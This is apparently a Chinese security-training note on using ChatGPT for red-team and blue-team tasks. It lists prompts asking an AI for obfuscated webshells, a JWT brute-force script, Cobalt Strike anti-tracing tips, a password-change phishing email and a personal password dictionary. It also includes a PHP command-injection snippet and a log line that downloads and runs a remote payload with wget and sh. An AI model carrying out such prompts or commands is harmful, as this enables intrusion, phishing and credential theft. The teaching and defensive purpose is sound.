---
title: ChatGPT4篇&注册升级&专业接口&结合红蓝队&Ai工具插件&高效赋能需求
published: 2026-01-24 16:00:00
description: 还没准备好。
tags: [基础入门]
category: 网络安全
draft: false
---

# 知识点

1. AI赋能-结合安全-ChatGPT4注册&便用&升级
2. AI赋能-结合安全-ChatGPT4专业接口&安全插件

## Chatgpt科普

1. ChatGPT是什么？

   ChatGPT一可能很多人被这个缩写的名字搞糊涂了，第一眼无法看出到底什么意思，GPT 的英文原文是Generative Pre-training Transformer(预训练生成模型），业界有人将ChatGPT概括为聊天机器人+搜索工具+文本创造工具的组合，或者简单理解它是一个生成式AI（内容生成器）。

2. ChatGPT能做什么?

   它的主要功能是协助回答问题、提供信息和生成有关历史、科学、地理等各种主题的信息，这些信息仅限于它所接受的训练，但其知识在不断扩展。

3. ChatGPT牛在哪里?
   （1）它是个通用的模型，只要提示词引导，就能快速适应不同领域。
   （2）它能理解你的问题，只要给的引导越多，它就能给出你想要的答案。

安全行业影响：

1. 整合多种恶意软件
2. 提升漏洞发现能力
3. 给新手攻击者赋能
4. 便于社会工程学攻击
5. 快速筛选和锁定目标
6. 模拟网络防御攻击技术

官网：
https://chatgpt.com/

国内镜像站：
rawchat.cn（打不开用sharedchat.top）

注册购买：
https://github.com/anyofai/anyofai.github.io

专业接口：
https://github.com/taranjeet/awesome-GPTs
https://github.com/fr0gger/Awesome-GPT-Agents

工具插件：
https://mp.weixin.qq.com/s/crfqpa_KqK6wR62N5gnVgQ

## 常规利用

### 红队

**红队：逆向免杀，红队APT，代码审计，安全开发**

#### 安全开发

1、如何使用Python写一个jwt 爆破脚本?
2、如何使用Python写一个webshell检测脚本?
3、如何使用Python写一个MS17010漏洞检测脚本?
4、使用PHP开发一个免杀混滑复杂的webshel1脚本
4.1、在渗透测试靶机中，发现PHP脚本被禁用了敏感函数，如何生成一个绕过的webshell

#### 逆向免杀

1. APK使用什么工具进行反编译？
2. 常见脱壳工具有那些？
3. 免杀中使用什么加壳效果好？

#### 代码审计

1. 下列代码会出现哪些安全漏洞？又该如何利用呢？

   ```php
   <?php
   
   if(isset($_POST['Submit'])){
   	// Get input
   	$target = $_REQUEST['ip'];
   	
   	// Determine OS and execute the ping command.
   	if(stristr(php_uname('s'),'Windows NT')){
   	// Windows
   		$cmd = shell_exec('ping ' . $target);
   	}
   	else {
   		//*nix
   		$cmd = shell_exec('ping -c 4' . $target);
   	}
   	// Feedback for the end user
   	$html .= "<pre>{$cmd}</pre>";
   }
   ?>
   ```

2. ThinkPHP历史漏洞有哪些？

3. shiro反序列化漏洞如何利用？

#### APT社工学

1. 防溯源：Cobaltstike如何防止被溯源
2. 钓鱼邮件：由于系统升级，公司通知员工必须修改自己的密码，请在新业务网站上进行修改，帮我写一份规范的邮件通知
3. 字典生成：用户名：xiaodi，电话：13512345678，QQ：471656814

### 蓝队

**蓝队：应急响应、日志分析、流量检测**

1. 平台项目：

   蓝队针对攻击威胁感知平台项目有哪些？

2. 日志分析：

   103.178.229.152 -－[12/Mar/2023:07:16:02 +0800]  "GET/shell?cd+/tmp;rm+-rf+*;wget+128.199.134.42/jaws;sh+/tmp/jaws HTTP/1.1" 404 146"-" "Hello，World"

3. 流量检测：

   写一个检测cobaltstrike payload的脚本

   写一个cobaltstrike检测rules规则



